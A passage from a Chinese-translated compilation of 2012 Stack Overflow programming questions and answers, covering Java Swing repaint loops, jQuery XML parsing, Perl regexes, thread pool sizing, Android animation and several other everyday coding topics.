    //check that the opacitiy is not set to true first
    if ( !isOpaque( ) ) {

        super.paintComponent( g );  
        return;
    }

    Graphics2D g2d = (Graphics2D) g;

    //to get height and width of the component  
    int w = getWidth();     
    int h = getHeight();

    /*generating gradient pattern from two colors*/
    GradientPaint gp = new GradientPaint( 0, 0, startColor, 0, h, endColor );
    g2d.setPaint( gp ); //set gradient color to graphics2D object
    g2d.fillRect( 0, 0, w, h ); //filling color
    setOpaque( false );
    //Generating Titleborder
    TitledBorder title;
    title= BorderFactory.createTitledBorder(new LineBorder(borderColor, 1, true), null, javax.swing.border.TitledBorder.LEFT, javax.swing.border.TitledBorder.DEFAULT_POSITION, new java.awt.Font("Arial", 0, 16), Color.BLACK);
    super.setBorder(title);  //appling border to JPanel
    super.paintComponent( g );
    setOpaque( true );
}

/**
 * Getters and setters 
 */
public Color getStartColor() {
    return startColor;
}

public void setStartColor(Color startColor) {
    this.startColor = startColor;
}

public Color getEndColor() {
    return endColor;
}

public void setEndColor(Color endColor) {
    this.endColor = endColor;
}

public Color getBorderColor() {
    return borderColor;
}

public void setBorderColor(Color borderColor) {
    this.borderColor = borderColor;
} 
```

}

我在另一个具有 JFrame 的类中使用它，如下所示：

```
public class CommencingWindow extends JFrame {

/**
 * The serial ID
 */
private static final long serialVersionUID = 1L;

/**
 * Content Panel
 */
private GradientPanel contentPane;

/**
 * Window specific attributes
 */
private GraphicsConfiguration translucencyCapableGC;

/**
 * Flag to indicate if frame supports shaping
 */
private boolean isShapingSupported;

/**
 * Flag used to indicate if frame supports opacity
 */
private boolean isOpacityControlSupported;

/**
 * Used to display an infinite progress bar
 */
private JLabel progress;

/**
 * Constructor
 * @throws MalformedURLException 
 * 
 */
public CommencingWindow(){

    //change default Java icon for a nicer one
    java.net.URL url = ClassLoader.getSystemResource("res/images/smarcos.png");
    Toolkit kit = Toolkit.getDefaultToolkit();
    Image img = kit.createImage(url);
    this.setIconImage(img);
    this.setUndecorated(true);
    this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    this.setTitle("SMarcos Coach");
    kit = this.getToolkit();
    isShapingSupported = AWTUtilitiesWrapper.isTranslucencySupported(AWTUtilitiesWrapper.PERPIXEL_TRANSPARENT);
    isOpacityControlSupported = AWTUtilitiesWrapper.isTranslucencySupported(AWTUtilitiesWrapper.TRANSLUCENT);
    AWTUtilitiesWrapper.isTranslucencySupported(AWTUtilitiesWrapper.PERPIXEL_TRANSLUCENT);
    GraphicsEnvironment ge = GraphicsEnvironment.getLocalGraphicsEnvironment();
    //get translucency properties of the current screen device
    translucencyCapableGC = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice().getDefaultConfiguration();
    if (!AWTUtilitiesWrapper.isTranslucencyCapable(translucencyCapableGC)) {
        translucencyCapableGC = null;

        GraphicsEnvironment env =
                GraphicsEnvironment.getLocalGraphicsEnvironment();
        GraphicsDevice[] devices = env.getScreenDevices();

        for (int i = 0; i < devices.length && translucencyCapableGC == null; i++) {
            GraphicsConfiguration[] configs = devices[i].getConfigurations();
            for (int j = 0; j < configs.length && translucencyCapableGC == null; j++) {
                if (AWTUtilitiesWrapper.isTranslucencyCapable(configs[j])) {
                    translucencyCapableGC = configs[j];
                }
            }
        }
        if (translucencyCapableGC == null) {
        }
    }

    // Determine what the default GraphicsDevice can support.
    GraphicsDevice[] gs = ge.getScreenDevices();
    Insets in = kit.getScreenInsets(gs[0].getDefaultConfiguration());
    Dimension d = kit.getScreenSize();
    //Get max screen width and height
    int max_width = (d.width - in.left - in.right);
    int max_height = (d.height - in.top - in.bottom);
    //calculate frame width and height
    int frameWidth = Math.min(max_width, 300);
    int frameHeight = Math.min(max_height, 100);
    //center frame relative to the screen
    int frameX = (int) (max_width - frameWidth) / 2;
    int frameY = (int) (max_height - frameHeight ) / 2;
    this.setSize(frameWidth, frameHeight);//whatever size you want but smaller the insets
    this.setLocation(frameX, frameY);

    //apply rounded corners to frame, if possible
    if (isShapingSupported) {
        Shape  shape = new RoundRectangle2D.Float(0, 0, frameWidth, frameHeight, 30, 30);
        AWTUtilitiesWrapper.setWindowShape(this, shape);
    }
    //apply some transparency, if possible
    if (isOpacityControlSupported) {
        AWTUtilitiesWrapper.setWindowOpacity(this, 1.0f);
    }

    //add the content panel to the frame
    contentPane = new GradientPanel();
    contentPane.setStartColor(new Color(170, 191, 236));
    contentPane.setEndColor(new Color(52, 101, 206));
    contentPane.setBorderColor(new Color(170, 191, 236));
    contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
    setContentPane(contentPane);
    contentPane.setLayout(null);

    //Smarcos Label
    JLabel lblSmarcos = new JLabel();
    String lblSmarcosText = "<html><font align=\"center\" size=\"5\" color=\"D1D1D1\">SMARCOS COACH</font></html>";
    lblSmarcos.setText(lblSmarcosText);
    lblSmarcos.setBounds(67, 14, 257, 30);
    contentPane.add(lblSmarcos);

    //Add a label to ask for the verifier
    JLabel lblVerifier = new JLabel();
    String lblVerifierText = "<html><font align=\"center\" size=\"3\" color=\"D1D1D1\">Trying to connect to DirectLife Oauth service...</font></html>";
    lblVerifier.setText(lblVerifierText);
    lblVerifier.setBounds(60, 45, 240, 30);
    contentPane.add(lblVerifier);

} 
```

}

现在我在一个主要方法中使用这两种方式：

```
 cw = new CommencingWindow();
    cw.setVisible(true); 
```

到目前为止没有什么奇怪或复杂的，现在如果我进入 shell 并运行“top”，这是 setVisible 调用后的输出：

![在此处输入图像描述](../Images/b3d81c9eacac9fdddc5aa7a773e83be1.png)

正如你所看到的，对于这样一个简单的应用程序来说，CPU 使用率是荒谬的，它永远在 90-80 之间波动......我担心 GradientPanel.paintComponent 一直被调用，这导致了这种行为。有人知道如何解决这个问题吗？一种指定何时应该调用或“刷新率”的方法会很好......

问候，亚历克斯

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-30T07:19:47.507

问题来自这一行：

```
 super.setBorder(title);  //appling border to JPanel 
```

这最终会触发重绘，导致您的组件不断重绘并占用您的 CPU。

要解决此问题，请删除该行并尝试从其他地方调用它，例如面板的构造函数。

通常，您不应在paintComponent 期间修改组件以避免此类问题。您应该只执行绘画操作。

# xml - jquery - 如何获取xml数据

> ID：10811511
> 
> 赞同：16
> 
> 时间：2012-05-30T07:06:22.870
> 
> 标签：xml, jquery

我完全是 html、css、javascript 和编程的菜鸟。请多多包涵。

我试图使用 jquery 填充我的表。数据将来自 xml 文件。

**`football_player.xml`：**

```
<?xml version="1.0" encoding="UTF-8"?>

<football_player>
  <name>Cristiano Ronaldo</name>
  <club>Real Madrid</club>
  <number>7</number>
  <country>Portugal </country>

  <name>Fernando Torres </name>
  <club>Chelsea </club>
  <number>9</number>
  <country>Spain</country>

  <name>Iker Casillas</name>
  <club>Real Madrid </club>
  <number>1</number>
  <country>Spain</country>

  <name>David Beckham</name>
  <club>Los Angeles Galaxy</club>
  <number>23</number>
  <country>England</country>
</football_player> 
```

我的html表：

```
<table>
  <thead>
    <tr>
      <th>Name</th>
      <th>Club</th>
      <th>Number</th>
      <th>Country</th>
    </tr>
  </thead>
  <tbody>
  </tbody>
  </tfoot>
  </tfoot>
</table> 
```

我的 javascript/jquery 脚本：

```
$(document).ready(function () {
  $.ajax({
    type: "GET",
    url: "football_player.xml",
    dataType: "xml",
    success: function(xml) {
      $(xml).find("football_player").each(function () {
        $("table tbody").append("<tr>");
        $("table tbody").append("<td>" + $(this).find("name").text() + "</td>");
        $("table tbody").append("<td>" + $(this).find("club").text() + "</td>");
        $("table tbody").append("<td>" + $(this).find("number").text() + "</td>");
        $("table tbody").append("<td>" + $(this).find("country").text() + "</td>");
        $("table tbody").append("</tr>");           
      });
    }
  });
}); 
```

我发誓我真的是个菜鸟。我不知道我在做什么。请帮忙。我真的很想学习。提前致谢。

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-05-30T07:19:18.613

示例 XML：

```
<?xml version="1.0" encoding="utf-8" ?>
  <RecentBooks>
     <Book>
      <Title>My Cool Book Title</Title>
    <Description>The my cool book is possibly the best cool book in that any developer could use to     be a great web designer.</Description>
    <Date>12/1/2010</Date>
    </Book>
    <Book>
     <Title>Another PHP book</Title>
    <Description>Learn everything about PHP with 'Another PHP book,' your ultimate guide to the ins and outs of PHP.</Description>
    <Date>4/1/2010</Date>
    </Book>
    <Book>
    <Title>jQuery Techniques</Title>
    <Description>jQuery techniques runs you through real life examples of jQuery from beginner to expert</Description>
     <Date>6/2/2010</Date>
     </Book>
     <Book>
    <Title>MySQL Database Book</Title>
    <Description>Brush up your knowledge with the best MySQL database book on the market.          </Description>
    <Date>14/2/2010</Date>
    </Book>
  </RecentBooks> 
```

还有 HTML 和 jquery。

```
$(document).ready(function () {
  $.ajax({
    type: "GET",
    url: "books.xml",
    dataType: "xml",
    success: xmlParser
  });
});

function xmlParser(xml) {
  $('#load').fadeOut();

  $(xml).find("Book").each(function () {
    $(".main").append('<div class="book"><div class="title">' + $(this).find("Title").text() + '</div><div class="description">' + $(this).find("Description").text() + '</div><div class="date">Published ' + $(this).find("Date").text() + '</div></div>');
    $(".book").fadeIn(1000);
  });
}

<div class="main">
  <div align="center" class="loader"><img src="loader.gif" id="load" width="16" height="11"   align="absmiddle"/></div>
</div>

<div class="clear"></div> 
```

你可以通过这个例子，你会得到同样的想法

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2018-03-20T09:37:36.507

我遇到了类似的问题，我使用 HTTP GET 获取 XML 数据，然后进行解析。以你为例：

```
$.ajax({
    type: "GET",
    url: "football_player.xml",
    ->dataType: "text",
    success: function(xml) {
        var parser = new DOMParser();
        var xmlDoc = parser.parseFromString(xml, "text/xml");
        var json = ->getJson(xmlDoc);
        for(var i =0; i< json[0].football_player.length;i++) {
            var player = json[0].football_player[i];
            $("table tbody").append("<tr>");
            $("table tbody").append("<td>" + ->player.name + "</td>");
            $("table tbody").append("<td>" + ->player.club + "</td>");
            $("table tbody").append("<td>" + ->player.number + "</td>");
            $("table tbody").append("<td>" + ->player.country + "</td>");
            $("table tbody").append("</tr>");
        }
    }
}); 
```

需要注意的三件事（->）：

1.  `dataType: "text"`我使用 TEXT 而不是 XML 的数据类型发出了 http 请求，因此我将 xml 数据作为字符串数据类型。

2.  `getJson(xmlDoc)`方法：我写了一个小函数来将 XML 转换为 Javascript 对象 (JSON)。还有其他小型实用程序可以做同样的事情。

3.  `player.name`：由于这种转换，您可以将 XML 内容用作 javascript 对象，从而更容易解析和阅读。

我在`getJson()`下面粘贴功能（它未经测试，我为 POC 制作了它，但对我有用）：

```
function getJson(xmlDoc) {
    var result = [];

    for (var i = 0; i < xmlDoc.children.length; i++) {
        var child = xmlDoc.children[i];
        if (result[child.tagName] === undefined) {
            result[child.tagName] = [];
        }

        var nodeJson = getJsonFromNode(xmlDoc.children[i]);
        result[child.tagName].push(nodeJson);
    }

    return result;
}

function getJsonFromNode(node) {
    var nodeJson = {};
    // for attributes
    for (var i = 0; i < node.attributes.length; i++) {
        var att = node.attributes[i];
        nodeJson[att.localName] = att.value;
    }

    // for child nodes
    for (var i = 0; i < node.children.length; i++) {
        var child = node.children[i];
        if (nodeJson[child.tagName] === undefined) {
            nodeJson[child.tagName] = [];
        }
        var result = getJsonFromNode(node.children[i]);
        nodeJson[child.tagName].push(result);
    }

    return nodeJson;
} 
```

# android - 在具有姜板的 BeagleBoard 中安装 apk 文件

> ID：10811516
> 
> 赞同：0
> 
> 时间：2012-05-30T07:06:45.170
> 
> 标签：android, android-2.3-gingerbread

我希望在具有姜饼 Android 的 beagle board 中安装 apk 文件。无法访问我的 sdk 卡中的文件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T19:18:15.960

如果您通过在 SD 卡上写入来安装文件，它将无法正常工作，您必须安装它们。

这样做的官方解决方案是调用（从shell）

```
 adb install [-r] yourPackage.apk 
```

（-r 是可选的，有时可能是必需的）

在 beagleboard 上，您通常运行一个根植于系统写入访问权限的 android，因此安装应该不是问题。

如果 adb 找不到设备，请阅读官方文档。您可能需要将 usb-vendor id 添加到 adb.ini/android.ini 并在 linux 系统上修改 udev-rules。但所有这些都记录在你所拥有的“android for beagleboard”版本中。

# perl - 如何使用正则表达式断言标量只有数字但没有字母字符？

> ID：10811520
> 
> 赞同：2
> 
> 时间：2012-05-30T07:06:58.897
> 
> 标签：perl

我想匹配一个变量`$x = 'AA12CB'`。我正在使用正则表达式

```
$x =~ /\b[0-9]+\b/ 
```

我想断言我只有数字，但没有字母字符。此正则表达式不起作用。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-30T07:40:30.663

您需要在字符串的开头和结尾**锚定模式以排除任何其他字符。**这类似于您尝试使用`\b`边界的方法。阅读[perlretut](http://p3rl.org/retut)了解锚定的含义，它出现了几次。

```
use 5.010;
my $x = 'AA12CB';
if ($x =~ /\A [0-9]+ \z/msx) {
    say 'only digits'
} else {
    say 'not only digits'
} 
```

也许您更愿意[确定标量是否是数字/整数/整数/浮点数](http://learn.perl.org/faq/perlfaq4.html#How-do-I-determine-whether-a-scalar-is-a-number-whole-integer-float-)。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-30T11:37:13.867

我认为对于没有行尾的字符串，这个表达式最能捕捉到这个标准：

```
$x !~ /\D/ 
```

这意味着在任何时候都不`$x`匹配非数字字符。当然，如果您仍然想要 un `chomp`-ed 字符串的行尾，那么您必须使用负字符类，如下所示：

$x !~ /[^\d\n]/

这`$x`与字符不是数字或换行符的字符串不匹配。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T10:11:30.223

如果您只是在测试数字性之后，[`Scalar::Util`](https://metacpan.org/module/Scalar%3a%3aUtil)'`looks_like_number`函数应该就足够了：

```
use Scalar::Util 'looks_like_number';

print   looks_like_number( $x )
      ?   "$x is numeric\n"
      :   "$x is non-numeric\n"; 
```

我认为`'0 but true'`您的应用程序中不会遇到古怪...

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-30T09:23:46.910

这也应该在 Perl 中工作。

```
$x = "AA12CB";
unless($x=~m/\D/) {
  print("$x: Just digits\n");
}
else {
  print("$x: Not just digits\n\n");
}

$x = "1223456";
unless($x=~m/\D/) {
  print("$x: Just digits\n");
}
else {
  print("$x: Not just digits\n");
} 
```

`\D`是这里的关键。它匹配任何不是数字的东西。您可以轻松地将其写为`if`and`else`而不是`unless`and `else`。

# android - android的pdf库？

> ID：10811522
> 
> 赞同：4
> 
> 时间：2012-05-30T07:07:12.270
> 
> 标签：android, pdf-reader

我正在开发一个小型应用程序，我必须在其中显示与下面链接中显示的完全一样的报纸 pdf 文件。这是一个链接新闻阅读器应用程序，它也显示报纸。我从互联网上搜索了很多，但不能找到任何好的 pdfReader 库。任何人都可以帮助我新闻阅读器（链接下方）如何在视图中显示他的报纸（pdf），或者如果可以通过任何其他方法获得相同的内容，请讨论。提前致谢..

[https://play.google.com/store/apps/details?id=com.newspaperdirect.pressreader.android&feature=search_result](https://play.google.com/store/apps/details?id=com.newspaperdirect.pressreader.android&feature=search_result)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-25T12:37:38.967

它很简单......你可以通过使用 Intent 函数来做到这一点。做以下过程，

1.使用 GRIDVIEW 显示图像，如您在 URL 中提到的屏幕截图所示。2.在GridItemSelected Listener上，调用intent函数来读取合适的pdf..

或者，如果你不想使用 Intent 函数意味着，只需去 itext 库阅读 pdf

# java - Java线程池：有很多小任务更好，还是有大批量任务更少

> ID：10811523
> 
> 赞同：4
> 
> 时间：2012-05-30T07:07:14.920
> 
> 标签：java, multithreading, threadpool

我们目前正在尝试通过在我们的 java 应用程序中使用多线程来调整性能。我们有一个长时间运行的串行任务，我们希望将其拆分为多个 CPU 内核。

基本上我们有一个清单，让我们说 100.000 件/要做的事情。

我现在的问题是这样做更好：

**选项 1**（伪代码）：

```
for(i = 0; i < 100000; i++){
  threadpool.submit(new MyCallable("1 thing to do"))
} 
```

这会将 100000 个可运行/可调用对象添加到线程池的队列（当前 LinkedBlockingQueue）

还是这样做更好： **选项2**（伪代码）

```
for(i = 0; i < 4; i++){
  threadpool.submit(new MyCallable("25000 things to do"))
} 
```

我们已经尝试了选项 1，但我们没有注意到任何性能改进，尽管我们可以清楚地看到多个线程疯狂地工作并且使用了 4 个 CPU 内核。但我的感觉是，由于任务众多，选项 1 中存在一些开销。我们还没有尝试过选项 2，但我的感觉是，它可以加快速度，因为开销更少。我们基本上将列表分成 4 个更大的块，而不是 100000 个单项。

对此有什么想法吗？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:09:07.617

您的分析是正确的：批处理项目的成本（内存、上下文切换和一般指令计数）会更少——至少，一般来说。

但是，随着单个任务变得越来越大，这变得越来越不重要——如果您已经将 99% 的时间用于工作，而不是线程池开销或对象创建，那么您只能以这种方式优化剩下的 1%。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-30T07:14:27.220

重要的是您将上下文切换的数量降至最低，并最大限度地增加每个任务的计算量。实际上，如果您的任务是计算，那么超过物理 CPU 的数量将无济于事。如果您的任务实际上执行了很多 I/O 和 I/O 等待，那么您希望拥有其中的许多任务，以便在一个阻塞时总是有一堆“就绪”任务可用。

如果你真的有 25000 件事情要做，而且事情是计算，我可能会设置 32 个线程（比你拥有的 CPU 更多，但不会有太多额外的开销），并为每个线程分配 10-50 个工作单元如果这些单位相对较小。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T07:11:02.187

好吧，这取决于您的用例。

性能方面，我认为拥有更大的工作块比更小的线程要好。上下文切换会更少，因此，您将能够节省 CPU 周期和 RAM。

当任务数量较少时，这可能无关紧要，但是是的，如果您有 10000 个线程，这确实很重要。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-30T07:22:11.557

您的机器中有 N 个内核。您想利用所有内核，但开销最小。因此，如果任务大小相等，则任务的最小数量可能为 N。如果它们不相等，则拥有 M*N 任务可能会更好，因为这可能意味着即使某些任务相对较短，所有内核也同样繁忙。例如，一个核心执行一项长任务，而另一个核心执行三个短任务。对于大多数用例，我使用 2-4 的 M。

如果可以的话，您可以对运行时间较长的任务进行排序以首先启动以获得最佳平衡。即在添加任务之前将任务从最长到最短排序。

例如，如果您有 8 个内核，您可能会发现 8 个任务最适合 CPU 密集型处理。对于 IO 绑定处理或需要不同时间量的任务，2*8 到 4*8 任务可能是最佳的。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-30T07:23:27.890

4个批次的问题可能是，如果其中一个在10分钟内完成，其中三个在20分钟内完成，则1个核心将在10分钟内不使用，而其他3个线程将在3个核心上处理项目。但是您对开销是正确的。但是验证的唯一方法是检查它，因为很多事情取决于您的数据。

# jquery - jQuery datepicker 限制月份

> ID：10811528
> 
> 赞同：0
> 
> 时间：2012-05-30T07:07:46.493
> 
> 标签：jquery, jquery-ui, datepicker

对不起，伙计们，似乎在手册中找不到这个，但我想它一定在那里。我需要将 UI 日期选择器上显示的月份限制为仅 5 月、6 月、7 月、8 月、9 月和 10 月。我看到很多 minDate 和 maxDate 但他们似乎为 minDate todate maxDate +3M 等设置了日期范围。请提出建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-30T07:25:36.067

OnChangeMonthYear 是您要附加到的事件。您可能需要检查月份是否超出允许的月份范围，然后将日期重置为下一年允许的下一个月的第一天。

```
$('.selector').datepicker({
    onChangeMonthYear: function(year, month, inst) {
    //0 based index on the months, from what I remember.
        if(month<4){
            year = year-1;
             $( this ).datepicker( "setDate" , new Date(year, 9, 1) )
             $( this ).datepicker("refresh");
        }

        if(month>9){
            year = year+1;
             $( this ).datepicker( "setDate" , new Date(year, 4, 1) )
             $( this ).datepicker("refresh");
        }

    }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-30T07:15:10.410

```
var currentYear = (new Date).getFullYear();

$( ".selector" ).datepicker(
  { minDate: new Date(currentYear, month, day, hours, minutes, seconds, milliseconds), 
    maxDate: new Date(currentYear, month, day, hours, minutes, seconds, milliseconds) }); 
```

这应该可以，不确定它是否有效。但是给出了这个想法

# jsp - 将 Struts 2 中的值从 JSP 传递到 JSP

> ID：10811530
> 
> 赞同：0
> 
> 时间：2012-05-30T07:07:54.510
> 
> 标签：jsp, struts2

我在 JSP 页面中有以下代码。

```
<s:url value="/user/search.jsp" >
    <s:param name="profile.gender" value="profile.gender"></s:param>
</s:url> 
```

它完美地链接到 /user/search.jsp 并且 profile.gender 的值显示在浏览器的地址栏中（一个查询字符串）。在我的 /user/search.jsp 中，如何在文本字段中访问和显示 profile.gender 的值？

```
<s:textfield value="?"/> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T08:19:16.860

正如已经建议的那样，不要从 jsp 移动到 jsp 而是通过操作

```
<s:url value="myaction.action" >
    <s:param name="gender" value="profile.gender"></s:param>
</s:url>

@Result(name="success", value="/search.jsp") // If you prefer annotation or configure in xml
public class MyAction extends ActionSupport {
  private String gender = null;
  //getter setter here    
  public String execute(){
    return Action.SUCCESS;
  }
} 
```

搜索.jsp

```
<s:textfield value="gender"/> 
```

# apache-flex - 无法在 Flex 应用程序中检索数据

> ID：10811534
> 
> 赞同：0
> 
> 时间：2012-05-30T07:08:15.850
> 
> 标签：apache-flex, httpwebrequest, xmlhttprequest

我正在开发一个 Flex 应用程序，我想从 XML 文件中获取一些数据。在我的 PC 中，我使用 HTTPService 获取数据，当我从同一网络中的其他 PC 尝试时，我收到权限错误。我已将 HTTPService 的 URL 属性指定为 myIPAddress/data.xml

我收到以下错误

```
[RPC Fault faultString="Security error accessing url" faultCode="Channel.Security.Error" faultDetail="Destination: DefaultHTTP"] 
```

我对此进行了搜索，发现需要将一个 crossdomainpolicy.xml 文件放在 web 根目录中以授予访问数据的权限。

这是我的 crossdomainpolicy.xml 文件的内容：

```
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
    <site-control permitted-cross-domain-policies="all"/>
    <allow-access-from domain="*"/>
</cross-domain-policy> 
```

我的问题仍然没有解决。有人可以帮我吗？

问候

迪霍

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-30T08:34:44.847

1.  您是否使用子域来拨打电话？corssdomain.xml 应该在子域根目录中。

2.  您能否提供您正在设置的 HTTPService url 的示例。

3.  你正在用吗：

Security.allowDomain("*");
Security.loadPolicyFile("http://yourdomain/crossdomain.xml");

# ios - 在音频编程中使用 vDSP_nzcros 进行过零

> ID：10811536
> 
> 赞同：1
> 
> 时间：2012-05-30T07:08:29.873
> 
> 标签：ios, audio, signal-processing

我想对 iOS 音频输入样本数据进行过零处理。作为[此处](https://developer.apple.com/library/mac/#documentation/Accelerate/Reference/vDSPRef/Reference/reference.html)的参考，vdsp_nzcros 函数可以计算过零。但是，当我尝试将一些虚拟变量放入其中时，我确实有一个错误，即 vdsp_nzcros 没有匹配函数

这是代码

> //r1 是一个浮点数 *
> 
> //r2 和 r3 是 int *
> 
> //其他数字随便放。
> 
> vDSP_nzcros(r1, 1, 5000, r2, r3, 312);

有人有想法吗？

# window - 如何使firefox webdriver浏览器窗口位于桌面的最前面

> ID：10811537
> 
> 赞同：3
> 
> 时间：2012-05-30T07:08:31.233
> 
> 标签：window, webdriver

我正在用 Selenium 2.0 在 Java、Win7 平台上编写自动化测试。在某些情况下，我需要 firefoxdriver 窗口位于桌面上所有窗口的前面，不仅是 firefoxdriver 的窗口，还包括手动打开的窗口（例如 eclispe IDE）。有没有办法做到这一点？我已经调查了 2 天，也许我需要一些 Windows API？任何意见，欢迎

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-09-02T07:38:46.813

我使用python，我得到了我想要的：

```
self.selenium.execute_script('alert(1);')
alert = self.selenium.switch_to.alert
alert.accept() 
```

希望这对以后的人有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-25T16:52:04.973

Python：

```
webdriver.execute_script('window.focus()') 
```

爪哇：

```
webdriver.executeScript('window.focus()') 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T14:35:32.677

这应该有助于定位窗口。一旦测试运行，它应该成为焦点。

```
 webDriver.Manage().Window.Position = new Point(screenPosition, 0);
   webDriver.Manage().Window.Size = new Size(width, height); 
```

# android - 安卓中的动画

> ID：10811540
> 
> 赞同：1
> 
> 时间：2012-05-30T07:08:46.490
> 
> 标签：android, animation

我创建了 animation.xml 文件，在其中添加了我的帧动画，但它不起作用我在我的活动类中调用了 5this，如下所示......

```
animation = (ImageView)findViewById(R.id.imageAnimation);
        animation.setBackgroundResource(R.drawable.animation);      // the frame-by-frame animation defined as a xml file within the drawable folder
        AnimationDrawable frameAnimation = 
                (AnimationDrawable) animation.getBackground();
            frameAnimation.start(); 
```

谁能告诉我那有什么问题

**动画.xmal 文件**

```
<animation-list xmlns:android="http://schemas.android.com/apk/res/android" 
    android:oneshot="false">

    <item android:drawable="@drawable/anatomy_5" android:duration="50" />
    <item android:drawable="@drawable/anatomy_6" android:duration="50" />
    <item android:drawable="@drawable/anatomy_7" android:duration="50" />
    <item android:drawable="@drawable/anatomy_8" android:duration="50" />
    <item android:drawable="@drawable/anatomy_9" android:duration="50" />
    <item android:drawable="@drawable/anatomy_10" android:duration="50" />
    <item android:drawable="@drawable/anatomy_11" android:duration="50" />
    <item android:drawable="@drawable/anatomy_12" android:duration="50" />
    <item android:drawable="@drawable/anatomy_13" android:duration="50" />
    <item android:drawable="@drawable/anatomy_14" android:duration="50" />
    <item android:drawable="@drawable/anatomy_15" android:duration="50" />
    <item android:drawable="@drawable/anatomy_16" android:duration="50" />
    <item android:drawable="@drawable/anatomy_17" android:duration="50" />
    <item android:drawable="@drawable/anatomy_18" android:duration="50" />
    <item android:drawable="@drawable/anatomy_19" android:duration="50" />
    <item android:drawable="@drawable/anatomy_20" android:duration="50" />
    <item android:drawable="@drawable/anatomy_21" android:duration="50" />
    <item android:drawable="@drawable/anatomy_22" android:duration="50" />
    <item android:drawable="@drawable/anatomy_23" android:duration="50" />
    <item android:drawable="@drawable/anatomy_24" android:duration="50" />
    <item android:drawable="@drawable/anatomy_25" android:duration="50" />
    <item android:drawable="@drawable/anatomy_26" android:duration="50" />
    <item android:drawable="@drawable/anatomy_27" android:duration="50" />
    <item android:drawable="@drawable/anatomy_28" android:duration="50" />
    <item android:drawable="@drawable/anatomy_29" android:duration="50" />
    <item android:drawable="@drawable/anatomy_30" android:duration="50" />
    <item android:drawable="@drawable/anatomy_31" android:duration="50" />
    <item android:drawable="@drawable/anatomy_32" android:duration="50" />
    <item android:drawable="@drawable/anatomy_33" android:duration="50" />
    <item android:drawable="@drawable/anatomy_34" android:duration="50" />
    <item android:drawable="@drawable/anatomy_35" android:duration="50" />
    <item android:drawable="@drawable/anatomy_36" android:duration="50" />
    <item android:drawable="@drawable/anatomy_37" android:duration="50" />
    <item android:drawable="@drawable/anatomy_38" android:duration="50" />
    <item android:drawable="@drawable/anatomy_39" android:duration="50" />
    <item android:drawable="@drawable/anatomy_40" android:duration="50" />
    <item android:drawable="@drawable/anatomy_41" android:duration="50" />
    <item android:drawable="@drawable/anatomy_42" android:duration="50" />
    <item android:drawable="@drawable/anatomy_43" android:duration="50" />
    <item android:drawable="@drawable/anatomy_44" android:duration="50" />
    <item android:drawable="@drawable/anatomy_45" android:duration="50" />
    <item android:drawable="@drawable/anatomy_46" android:duration="50" />
    <item android:drawable="@drawable/anatomy_47" android:duration="50" />
    <item android:drawable="@drawable/anatomy_48" android:duration="50" />
    <item android:drawable="@drawable/anatomy_49" android:duration="50" />

</animation-list> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-30T07:15:44.873

[如可绘制动画示例](http://developer.android.com/guide/topics/graphics/drawable-animation.html)页面的底部所示：

> 需要注意的是，在 Activity 的 onCreate() 方法期间不能调用 AnimationDrawable 上调用的 start() 方法，因为 AnimationDrawable 尚未完全附加到窗口。如果您想立即播放动画而不需要交互，那么您可能希望从 Activity 中的 [onWindowFocusChanged()](http://developer.android.com/reference/android/app/Activity.html#onWindowFocusChanged%28boolean%29)方法调用它，当 Android 使您的窗口成为焦点时，该方法将被调用。

希望它有帮助.. ;) 干杯

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-30T07:13:44.227

试试这个

把你的`animation.xml`文件放在`anim`文件夹里

**简单动画**

```
Animation rAnim = AnimationUtils.loadAnimation(your_context, R.anim.animation);
animation.startAnimation(rAnim); 
```

`animation`你在哪里`imageview`

**更新**

**可绘制动画**

```
 AnimationDrawable rocketAnimation;

    public void onCreate(Bundle savedInstanceState) {
      super.onCreate(savedInstanceState);
      setContentView(R.layout.main);

      ImageView rocketImage = (ImageView) findViewById(R.id.rocket_image);
      rocketImage.setBackgroundResource(R.drawable.rocket_thrust);
      rocketAnimation = (AnimationDrawable) rocketImage.getBackground();
       final Thread thread = new Thread(new Runnable() 
    {
    @Override
    public void run() 
    { wait(1000);      
     activity.runOnUiThread(new Runnable() {@Override public void run()
    {
     rocketAnimation.start();
    }});
     }
});
thread.start();

    }

    public boolean onTouchEvent(MotionEvent event) {
      if (event.getAction() == MotionEvent.ACTION_DOWN) {
        rocketAnimation.start();
        return true;
      }
      return super.onTouchEvent(event);
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-30T07:23:16.753

在**res**中制作文件夹**anim**并将您的**animation.xml**放在**anim**文件夹中，然后使用这种方式

 ******```
 Animation anim = AnimationUtils.loadAnimation(this,R.anim.animation);
 imageview.setAnimation(anim); 
 or
 imageview.startAnimation(anim); 
```******

# java - Java ImageIO，不能设置像素值？

> ID：10811542
> 
> 赞同：0
> 
